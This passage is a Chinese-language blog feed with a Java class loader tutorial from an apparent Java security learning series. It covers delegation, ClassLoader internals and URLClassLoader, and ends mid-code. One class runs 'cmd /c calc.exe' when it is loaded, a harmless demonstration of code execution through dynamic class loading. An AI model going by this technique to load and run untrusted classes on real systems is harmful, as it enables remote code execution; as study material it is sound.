<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>郁涛丶&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-27T05:57:59.709Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>郁涛丶</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>胡言乱语&amp;自言自语</title>
    <link href="http://example.com/2099/12/31/TOP/"/>
    <id>http://example.com/2099/12/31/TOP/</id>
    <published>2099-12-30T16:00:00.000Z</published>
    <updated>2021-11-27T05:57:59.709Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哥,别试了" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="9e0d3fa274fb94ddc6ec19b57a992bafd332081c1d4e40ef7d9c34d881b3f6fa"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">密码不记得，只有本地有</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Java-类加载器</title>
    <link href="http://example.com/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>http://example.com/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-04-19T16:00:00.000Z</published>
    <updated>2022-04-21T15:10:38.394Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言-流程"><a href="#前言-流程" class="headerlink" title="前言+流程"></a>前言+流程</h1><p>java语言依赖JVM，运行的时候，需要先编译成class文件，之后java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法来定义一个<code>java.lang.Class</code>实例。</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/JvmSpec7.png" alt="JVM"></p><p>类文件编译流程：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108150835-53436af4-5180-1.png" alt="img"></p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过jdk自带的javap命令反汇编查看class文件对应的<code>com.yutao.day1.ClassLoaderLearn</code>类，</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161921106.png" alt="image-20220421161921106"></p><p>JVM在执行<code>ClassLoaderLearn</code>之前会先解析class的二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421161945724.png" alt="image-20220421161945724"></p><h1 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h1><blockquote><p>  类加载阶段分为加载、连接、初始化三个阶段，而加载阶段需要通过类的全限定名来获取定义了此类的二进制字节流。<strong>Java特意把这一步抽出来用类加载器来实现</strong>。把这一步骤抽离出来使得应用程序可以按需自定义类加载器。并且得益于类加载器，OSGI、热部署等领域才得以在JAVA中得到应用。</p><p>  在Java中<strong>任意一个类都是由这个类本身和加载这个类的类加载器来确定这个类在JVM中的唯一性</strong>。也就是你用你A类加载器加载的<code>com.aa.ClassA</code>和你A类加载器加载的<code>com.aa.ClassA</code>它们是不同的，也就是用<code>instanceof</code>这种对比都是不同的。所以即使都来自于同一个class文件但是由不同类加载器加载的那就是两个独立的类。</p></blockquote><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/20210108151613-642298d0-5181-1.png" alt="img"></p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/sqqqqq.png" alt="双亲委派模型"></p><p>双亲委派的意思是如果一个类加载器需要加载类，那么首先它会把这个类请求委派给父类加载器去完成，每一层都是这样。一直到顶层后，父类的加载器也不能完成该请求时，子类才会尝试加载，。这里父类并不是继承关系，而是委派、逻辑的关系。</p><p>优点：</p><ul><li>  能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。</li><li>  保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。</li></ul><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p>类加载器大致分为两种，一种是JVM自带的类加载器，分别为<strong>引导类加载器</strong>、<strong>扩展类加载器</strong>和<strong>APP类加载器/系统类加载器</strong>。另外一种就是用户<strong>自定义的类加载器</strong>，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。</p><p>所有java类必须经过jvm加载后才能运行，<code>ClassLoader</code>主要作用就是java类文件的加载，在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>。<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><h2 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h2><blockquote><p>  引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。</p></blockquote><p>rt.jar里的类都是由<code>BootstrapClassLoader</code>来加载：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165137430.png" alt="image-20220421165137430"></p><p><code>BootstrapClassLoader</code>无父加载器 ：</p><p>object类是所有子类的父类，这里使用object：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421165519027.png" alt="image-20220421165519027"></p><h2 id="扩展类加载器"><a href="#扩展类加载器" class="headerlink" title="扩展类加载器"></a>扩展类加载器</h2><blockquote><p>  扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。</p></blockquote><p>这里的jar包都由扩展类加载器进行加载：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421170413392.png" alt="image-20220421170413392"></p><p>比如选择dnsns.jar：</p><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171127650.png" alt="image-20220421171127650"></p><h2 id="APP类加载器-系统类加载器"><a href="#APP类加载器-系统类加载器" class="headerlink" title="APP类加载器/系统类加载器"></a>APP类加载器/系统类加载器</h2><blockquote><p>  App类加载器/系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它</p></blockquote><p><img src="/2022/04/20/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20220421171428090.png" alt="image-20220421171428090"></p><h1 id="Java类动态加载方式"><a href="#Java类动态加载方式" class="headerlink" title="Java类动态加载方式"></a>Java类动态加载方式</h1><p>java类加载分为显式和隐式</p><p>显式：通过java反射或者ClassLoader来动态加载一个类</p><p>隐式：<code>类名.方法名()</code>或者new 示例，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认会初始化被加载类的静态属性和方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载</span></span><br><span class="line"><span class="keyword">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.xxx.xx.xx..x.x.x.xx&quot;</span>);<span class="comment">//默认不会初始化</span></span><br></pre></td></tr></table></figure><h1 id="ClassLoader类核心方法"><a href="#ClassLoader类核心方法" class="headerlink" title="ClassLoader类核心方法"></a>ClassLoader类核心方法</h1><p>除了<code>BootstrapClassLoader</code>，其他类加载器都继承<code>ClassLoader</code>，下面是核心方法：</p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li> <code>loadClass</code>（加载指定的Java类）</li><li> <code>findClass</code>（查找指定的Java类）</li><li> <code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li> <code>defineClass</code>（定义一个Java类,将字节码解析成虚拟机识别的Class对象）</li><li> <code>resolveClass</code>（链接指定的Java类）</li></ol><h2 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h2><p>加载指定的java类:</p><p>loadClass:</p><ol><li> 首先使用<code>getClassLoadingLock()</code>检查这个类是否被加载过。</li><li> 调用<code>findLoadedClass</code>检查是否已经初始化，如果JVM已经初始化过该类，返回类对象</li><li> 如果创建当前<code>ClassLoader</code>时传入了父类加载器，就是用父类加载器加载，否则使用<code>Bootstrap ClassLoader</code>加载</li><li> 如果上一步还未加载，调用<code>findClass</code>加载类。</li><li> 如果当前<code>ClassLoader</code>没有重写<code>findClass</code>方法，返回异常</li><li> ……..</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, Boolean resolve) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line"><span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c = findBootstrapClassOrNull(name);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line"><span class="comment">// from the non-null parent class loader</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line"><span class="comment">// to find the class.</span></span><br><span class="line"><span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">c = findClass(name);</span><br><span class="line"><span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">resolveClass(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h2><p>查找指定的Java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Finds the class with the specified &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.</span></span><br><span class="line"><span class="comment"> * This method should be overridden by class loader implementations that</span></span><br><span class="line"><span class="comment"> * follow the delegation model for loading classes, and will be invoked by</span></span><br><span class="line"><span class="comment"> * the &#123;<span class="doctag">@link</span> #loadClass &lt;tt&gt;loadClass&lt;/tt&gt;&#125; method after checking the</span></span><br><span class="line"><span class="comment"> * parent class loader for the requested class.  The default implementation</span></span><br><span class="line"><span class="comment"> * throws a &lt;tt&gt;ClassNotFoundException&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The resulting &lt;tt&gt;Class&lt;/tt&gt; object</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassNotFoundException</span></span><br><span class="line"><span class="comment"> *          If the class could not be found</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="findLoadedClass"><a href="#findLoadedClass" class="headerlink" title="findLoadedClass"></a>findLoadedClass</h2><p>查找JVM已经加载过的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the class with the given &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; if this</span></span><br><span class="line"><span class="comment"> * loader has been recorded by the Java virtual machine as an initiating</span></span><br><span class="line"><span class="comment"> * loader of a class with that &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.  Otherwise</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;null&lt;/tt&gt; is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object, or &lt;tt&gt;null&lt;/tt&gt; if the class has</span></span><br><span class="line"><span class="comment"> *          not been loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Converts an array of bytes into an instance of class &lt;tt&gt;Class&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> * Before the &lt;tt&gt;Class&lt;/tt&gt; can be used it must be resolved.  This method</span></span><br><span class="line"><span class="comment"> * is deprecated in favor of the version that takes a &lt;a</span></span><br><span class="line"><span class="comment"> * href=&quot;#name&quot;&gt;binary name&lt;/a&gt; as its first argument, and is more secure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  b</span></span><br><span class="line"><span class="comment"> *         The bytes that make up the class data.  The bytes in positions</span></span><br><span class="line"><span class="comment"> *         &lt;tt&gt;off&lt;/tt&gt; through &lt;tt&gt;off+len-1&lt;/tt&gt; should have the format</span></span><br><span class="line"><span class="comment"> *         of a valid class file as defined by</span></span><br><span class="line"><span class="comment"> *         &lt;cite&gt;The Java&amp;trade; Virtual Machine Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  off</span></span><br><span class="line"><span class="comment"> *         The start offset in &lt;tt&gt;b&lt;/tt&gt; of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  len</span></span><br><span class="line"><span class="comment"> *         The length of the class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object that was created from the specified</span></span><br><span class="line"><span class="comment"> *          class data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassFormatError</span></span><br><span class="line"><span class="comment"> *          If the data did not contain a valid class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IndexOutOfBoundsException</span></span><br><span class="line"><span class="comment"> *          If either &lt;tt&gt;off&lt;/tt&gt; or &lt;tt&gt;len&lt;/tt&gt; is negative, or if</span></span><br><span class="line"><span class="comment"> *          &lt;tt&gt;off+len&lt;/tt&gt; is greater than &lt;tt&gt;b.length&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  SecurityException</span></span><br><span class="line"><span class="comment"> *          If an attempt is made to add this class to a package that</span></span><br><span class="line"><span class="comment"> *          contains classes that were signed by a different set of</span></span><br><span class="line"><span class="comment"> *          certificates than this class, or if an attempt is made</span></span><br><span class="line"><span class="comment"> *          to define a class in a package with a fully-qualified name</span></span><br><span class="line"><span class="comment"> *          that starts with &quot;&#123;<span class="doctag">@code</span> java.&#125;&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #loadClass(String, boolean)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #resolveClass(Class)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span>  Replaced by &#123;<span class="doctag">@link</span> #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> * defineClass(String, byte[], int, int)&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h2><p>链接指定java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links the specified class.  This (misleadingly named) method may be</span></span><br><span class="line"><span class="comment"> * used by a class loader to link a class.  If the class &lt;tt&gt;c&lt;/tt&gt; has</span></span><br><span class="line"><span class="comment"> * already been linked, then this method simply returns. Otherwise, the</span></span><br><span class="line"><span class="comment"> * class is linked as described in the &quot;Execution&quot; chapter of</span></span><br><span class="line"><span class="comment"> * &lt;cite&gt;The Java&amp;trade; Language Specification&lt;/cite&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  c</span></span><br><span class="line"><span class="comment"> *         The class to link</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  NullPointerException</span></span><br><span class="line"><span class="comment"> *          If &lt;tt&gt;c&lt;/tt&gt; is &lt;tt&gt;null&lt;/tt&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>  #defineClass(String, byte[], int, int)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    resolveClass0(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="用户自定义ClassLoader"><a href="#用户自定义ClassLoader" class="headerlink" title="用户自定义ClassLoader"></a>用户自定义ClassLoader</h1><p>实际使用中，不仅仅希望使用classpath中的类或者jar包，还可能希望使用本地磁盘或者网上的，这时候就用到了自定义类加载的方式。</p><p>上面的loadclass中，调用的是findClass(String)方法，所以加载自定义类的话重写的是findClass而不是loadClass</p><p>步骤：</p><ol><li> 继承ClassLoader</li><li> 重写findClass()</li><li> 在findClass中调用defineClass方法</li></ol><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p>继承自ClassLoader，可以加载本地磁盘和网络中的jar包类文件。</p><p>本地class文件调用：</p><p>先写个java，内容是弹计算器，和sout</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">execcalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">execcalc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Test success!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//E:\github\JavaSecLearn\Code\JavaSecLearn\src\com\yutao\day1</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.day1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderLearn</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NullPointerException, InstantiationException, IllegalAccessException, MalformedURLException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;E:\\github\\JavaSecLearn\\Code\\JavaSecLearn\\src\\com\\yutao\\day1\\&quot;</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">&quot;com.yutao.day1.execcalc&quot;</span>);</span><br><span class="line">        